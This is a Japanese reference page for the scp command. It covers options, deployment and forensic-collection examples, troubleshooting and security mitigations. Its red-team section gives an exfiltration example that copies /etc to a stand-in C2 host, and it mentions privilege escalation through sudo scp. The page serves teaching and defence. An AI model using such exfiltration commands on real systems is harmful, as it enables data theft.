# `scp` - SSHプロトコルで安全にファイルをコピーする

## 概要

`scp` (secure copy) は、SSHプロトコルを利用して、ローカルホストとリモートホスト間、または2つのリモートホスト間でファイルを安全にコピーするためのコマンドラインユーティリティです。通信はSSHによって暗号化されるため、FTPのようにパスワードやデータが平文でネットワーク上を流れることはありません。`cp` コマンドに似たシンプルな構文で、安全なファイル転送を実現します。

(出自: `openssh-client` パッケージに含まれる)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- |:---|
| ⭐ **`rsync`** | `scp` よりも高機能なファイル同期ツール。差分転送アルゴリズムにより、2回目以降の転送が非常に高速です。ディレクトリ全体の同期や大規模な転送には `rsync` が効率的です。 | `rsync` (ディレクトリ同期) |
| **`sftp`** | 対話的なファイル転送セッションを提供します。FTPのように `ls`, `get`, `put` などのコマンドを使ってリモートを操作できます。単発のファイルコピーなら `scp`、対話的に操作したいなら `sftp` を使います。| `sftp` (対話的操作) |
| **`cp`** | **ローカルホスト内**でファイルをコピーします。`scp` は**ネットワーク越しの**コピーを行います。 | - |

## よく連携されるコマンド

`scp` は、`tar` と連携して、ディレクトリを一度アーカイブしてから転送する、というワークフローでよく使われます。

### シナリオ例: ディレクトリを圧縮して転送する (インフラ構築・運用視点)

* **目的**: Webアプリケーションのソースコードディレクトリ全体を、効率的にリモートサーバーにアップロードする。
* **連携コマンド**: `tar`, `scp`
* **解説**: 多数の小さなファイルを個別に `scp -r` で転送するよりも、まず `tar` で1つの圧縮ファイルにまとめた方が、ネットワーク転送のオーバーヘッドが少なくなり高速です。
* **コマンド例**:

```bash
# 1. カレントディレクトリの 'my-app' を 'my-app.tar.gz' として圧縮アーカイブ
tar czf my-app.tar.gz ./my-app

# 2. 作成したアーカイブファイルを scp でサーバーに転送
scp my-app.tar.gz user@remote-server:/opt/deploy/
```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **基本操作** | |
| ⭐ `-r` | **ディレクトリ**を再帰的にコピーします。 |
| ⭐ `-i <key_file>`| 認証に使用する**秘密鍵**のパスを指定します。 |
| ⭐ `-P <port>` | (大文字のP) 接続先のSSHポート番号を指定します。デフォルトは22です。 |
| **属性・その他** | |
| `-p` | (小文字のp) 元ファイルの更新日時、アクセス日時、パーミッションを保持したままコピーします。 |
| `-v` | (Verbose) デバッグ情報を表示します。接続の問題をトラブルシューティングする際に便利です。 |
| `-C` | 転送中にデータを圧縮します。低速なネットワークで有効です。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: ローカルのファイルをリモートサーバーにアップロードする。
* **組み合わせ**: `scp -i <key_file> <local_file> <user>@<host>:<dest_path>`
* **解説**: 特定の秘密鍵を使って、アプリケーションのデプロイパッケージなどをサーバーに安全にアップロードします。
* **例**:

```bash
# アプリケーションパッケージをサーバーにアップロード
scp -i ~/.ssh/prod-key.pem latest-build.zip user@prod-server.example.com:/opt/deploy/
```

### 2. ブルーチーム視点

* **タスク**: 侵害されたホストから、ファイルのタイムスタンプを維持したまま証拠を収集する。
* **組み合わせ**: `scp -p <user>@<compromised_host>:<evidence_file> .`
* **解説**: `-p` オプションでタイムスタンプを保持します。「いつファイルが作成・変更されたか」という情報は重要な証拠であり、これを変更せずにコピーすることがフォレンジック調査では不可欠です。
* **例**:

```bash
# 改ざんされた可能性のあるファイルをタイムスタンプを維持したまま収集
scp -p analyst@compromised-host:/var/www/html/uploads/shell.php ./
```

### 3. レッドチーム視点

* **タスク**: **データ窃取 (Data Exfiltration)**。標的のシステムから盗み出した機密データを外部のサーバーに送信する。
* **組み合わせ**: `scp -r /path/to/loot user@attacker-c2-server:/loot/`
* **解説**: 攻撃者は、データベースのダンプファイルや設定ファイルなどを窃取した後、`scp` を使って暗号化されたSSH経由で自身のサーバーにアップロードします。
* **例**:

```bash
# 窃取した /etc ディレクトリを丸ごとC2サーバーに送信
scp -r /etc attacker@c2.example.com:/loot/etc_backup
```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **エラーメッセージ例 1**: `Permission denied (publickey,password).`
    * **考えられる原因**: SSHの認証エラー。ユーザー名、パスワード、秘密鍵のいずれかが間違っているか、サーバー側で許可されていません。
    * **解決策**: 認証情報を再確認してください。`ssh -v` で接続を試みると、より詳細なデバッグ情報が得られます。

2. **エラーメッセージ例 2**: `scp: <remote_path>: No such file or directory`
    * **考えられる原因**: 指定したコピー元ファイル（リモート→ローカルの場合）または、コピー先ディレクトリ（ローカル→リモートの場合）がリモートホストに存在しません。
    * **解決策**: リモートホストに `ssh` でログインし、パスが正しいかを確認してください。

## 環境変数と設定ファイル

* 一般的な環境変数・設定ファイルは [Linux共通の環境変数・設定ファイル](./environment_and_config.md) を参照。
* `scp` は `~/.ssh/config` の設定（ホスト名エイリアス、ユーザー名、ポート、秘密鍵など）を読み込んで利用します。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: `scp` 自体よりも、基盤となる**SSHの認証**や**ホストキーの検証**が重要です。
* **悪用シナリオ**: 攻撃者は、窃取した秘密鍵やブルートフォースで特定したパスワードを使い、`scp` を**ツール（マルウェア）のアップロード**や**データの窃取**のための安全なチャネルとして利用します。

### GTFOBins / LOLBAS における利用例

* **機能**: **File Upload**, **File Download**, **Privilege Escalation**
* **解説**: `scp` は環境寄生型バイナリ(LOLBAS)として利用されます。また、もしユーザーが `sudo scp` を実行できる権限を持っている場合、`-o ProxyCommand` のような高度なオプションを悪用して、任意のコマンドを実行できる可能性があります。
* **参照**: `https://gtfobins.github.io/gtfobins/scp/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: SSHはパスワード認証を無効化し、強力なパスフレーズで保護されたSSH鍵認証のみを許可する。`sudoers` の設定を厳格にする。
* **Detection (検知)**: `sshd` のログをSIEMなどに集約し、不審なIPアドレスからのログインや、大量のファイル転送がないかを監視する。

## 注意点・補足

* **ワイルドカード**: `scp "user@host:/remote/path/*.log" .` のように、リモートパスのワイルドカードは、シェルにローカルで展開されないようにダブルクォートで囲む必要があります。
